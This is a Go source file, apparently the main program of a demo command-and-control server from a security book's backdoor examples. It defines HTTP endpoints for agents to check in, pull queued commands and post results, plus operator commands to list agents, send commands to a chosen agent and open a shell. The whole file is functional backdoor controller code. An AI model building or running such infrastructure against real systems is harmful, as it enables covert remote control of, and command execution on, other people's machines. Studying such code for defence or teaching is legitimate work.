/*

Copyright (c) 2018 sec.lu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THEq
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/gin-gonic/gin"

	"sec-dev-in-action-src/backdoor/command-control/command-control-demo/server/cli"
	"sec-dev-in-action-src/backdoor/command-control/command-control-demo/server/models"
	"sec-dev-in-action-src/backdoor/command-control/command-control-demo/server/routers"
)

func setupRouter() *gin.Engine {
	r := gin.Default()

	r.POST("/ping", routers.Ping)
	r.POST("/cmd/:uuid", routers.GetCommand)
	r.POST("/send_result/:id", routers.SendResult)

	return r
}

func main() {
	if len(os.Args) == 1 {
		fmt.Printf("%v [remove_agent|list_agent|list_cmd|run command|serv|shell]\n", os.Args[0])
		os.Exit(0)
	}
	cmd := strings.ToLower(os.Args[1])
	parameters := ""
	if len(os.Args) > 2 {
		parameters = strings.Join(os.Args[2:], " ")
	}
	switch cmd {
	case "serv":
		_ = models.RemoveAll()
		r := setupRouter()
		err := r.Run(":8080")
		_ = err
	case "run":
		fmt.Printf("run %v", parameters)
		if len(os.Args) >= 3 {
			agent := os.Args[2]
			c := strings.Join(os.Args[3:], " ")
			err := cli.RunCommand(agent, c)
			_ = err
		}
	case "list_agent":
		_, _ = cli.ListAgents()
	case "list_cmd":
		_, _ = cli.ListCommand(parameters)
	case "remove_agent":
		_ = models.RemoveAll()
	case "shell":
		_ = cli.Shell()
	}
}
